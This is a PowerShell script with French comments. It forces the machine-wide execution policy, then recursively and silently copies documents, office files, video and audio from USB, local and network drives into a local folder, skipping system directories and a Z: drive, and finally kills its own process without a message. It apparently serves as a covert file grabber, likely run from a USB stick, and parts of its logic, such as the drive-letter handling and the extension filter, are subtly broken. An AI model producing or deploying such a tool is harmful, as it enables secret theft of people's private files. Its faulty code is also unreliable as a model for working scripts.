# Ajouter les accès nécessaires
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force

# Configuration
$targetDirectory = "autres\Datas"   # Dossier cible
$logFile = "autres\log.log"         # Fichier de log pour les erreurs
$excludedDrive = "Z:\"       # Clé USB ou périphérique à exclure
$priorityDrives = @("P:\")   # Lecteurs prioritaires
$excludedDirs = @("Windows", "autres", "msys64", "flutter", "ffmpeg", "Drivers", ".vscode", "edb", "path", "PerfLogs", ".gradle", "ProgramData", "Recovery", "XboxGames", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information")
# Extensions autorisées pour les fichiers
$allowedExtensions = @(".pdf", ".doc", ".docx", ".odt", ".ppt", ".pptx", ".xls", ".xlsx", ".mp4", ".mov", ".avi", ".mp3", ".wav", ".flac", ".ogg")
$allowedExtensionsForC = $allowedExtensions -notmatch @(".jpg", ".jpeg", ".png", ".bmp", ".gif", ".txt")

# Assurez-vous que le dossier cible existe
if (!(Test-Path $targetDirectory)) {
    New-Item -ItemType Directory -Path $targetDirectory | Out-Null
}

# Assurez-vous que le fichier de log existe
if (!(Test-Path $logFile)) {
    New-Item -ItemType File -Path $logFile | Out-Null
}

# Fonction pour consigner une erreur dans le fichier de log
function Log-Error {
    param (
        [string]$errorMessage
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "[$timestamp] $errorMessage"
}

# Fonction pour gérer les conflits de noms
function Resolve-NameConflict {
    param (
        [string]$path
    )

    if (-not (Test-Path $path)) {
        return $path
    }

    $directory = Split-Path -Path $path -Parent
    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($path)
    $extension = [System.IO.Path]::GetExtension($path)
    $counter = 1

    do {
        $newName = "$baseName($counter)$extension"
        $newPath = Join-Path -Path $directory -ChildPath $newName
        $counter++
    } while (Test-Path $newPath)

    return $newPath
}

# Fonction pour copier un fichier immédiatement
function Copy-File {
    param (
        [string]$sourcePath,
        [string]$targetBase,
        [string]$driveLetter,
        [bool]$isCDrive = $false
    )

    try {
        $item = Get-Item -Path $sourcePath -ErrorAction Stop

        # Extensions autorisées pour les fichiers
        $currentAllowedExtensions = if ($isCDrive) { $allowedExtensionsForC } else { $allowedExtensions }
        if (-not $item.PSIsContainer -and $currentAllowedExtensions -contains $item.Extension) {
            # Remplacer la lettre du lecteur
            $normalizedPath = $sourcePath.Replace("$driveLetter", "$driveLetter;")
            $destinationPath = Join-Path -Path $targetBase -ChildPath $normalizedPath.Substring(3)
            $destinationPath = Resolve-NameConflict $destinationPath

            # Créer le dossier cible si nécessaire
            $directoryPath = Split-Path -Path $destinationPath -Parent
            if (!(Test-Path $directoryPath)) {
                New-Item -ItemType Directory -Path $directoryPath | Out-Null
            }

            # Copier le fichier
            Copy-Item -Path $sourcePath -Destination $destinationPath -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Log-Error -errorMessage "Erreur lors du traitement de $sourcePath : $($_.Exception.Message)"
    }
}

# Fonction pour traiter un dossier récursivement
function Process-Directory {
    param (
        [string]$sourcePath,
        [string]$targetBase,
        [string]$driveLetter,
        [bool]$isCDrive = $false
    )

    try {
        $items = Get-ChildItem -Path $sourcePath -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            # Skip dossiers commençant par "."
            if ($item.PSIsContainer -and $item.Name.StartsWith(".")) {
                continue
            }

            if ($item.PSIsContainer) {
                # Vérifier si le dossier est exclu
                if ($excludedDirs -contains $item.Name) {
                    continue
                }
                # Traiter le dossier récursivement
                Process-Directory -sourcePath $item.FullName -targetBase $targetBase -driveLetter $driveLetter -isCDrive $isCDrive
            }
            else {
                # Copier le fichier immédiatement
                Copy-File -sourcePath $item.FullName -targetBase $targetBase -driveLetter $driveLetter -isCDrive $isCDrive
            }
        }
    }
    catch {
        Log-Error -errorMessage "Erreur lors de l'accès à $sourcePath : $($_.Exception.Message)"
    }
}

# Traiter un lecteur donné
function Process-Drive {
    param (
        [string]$driveLetter,
        [bool]$isCDrive = $false
    )

    try {
        Process-Directory -sourcePath $driveLetter -targetBase $targetDirectory -driveLetter $driveLetter -isCDrive $isCDrive
    }
    catch {
        Log-Error -errorMessage "Erreur lors de l'accès au lecteur $driveLetter : $($_.Exception.Message)"
    }
}

# Identifier tous les lecteurs
$drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -in @(2, 3, 4) } # Type 2=Externe, 3=Local, 4=Réseau

# Traiter les clés USB en priorité
foreach ($drive in $drives | Where-Object { $_.DriveType -eq 2 }) {
    Process-Drive -driveLetter $drive.DeviceID
}

# Traiter les lecteurs prioritaires
foreach ($priorityDrive in $priorityDrives) {
    if (Test-Path $priorityDrive) {
        Process-Drive -driveLetter $priorityDrive
    }
}

# Traiter le lecteur C: avec des règles spécifiques
foreach ($drive in $drives | Where-Object { $_.DeviceID -eq "C:\" }) {
    Process-Drive -driveLetter "C:\" -isCDrive $true
}

# Traiter les autres lecteurs
foreach ($drive in $drives | Where-Object { $_.DriveType -ne 2 -and $_.DeviceID -ne "C:\" }) {
    Process-Drive -driveLetter $drive.DeviceID
}

# Terminer sans message
Stop-Process -Id $PID -Force
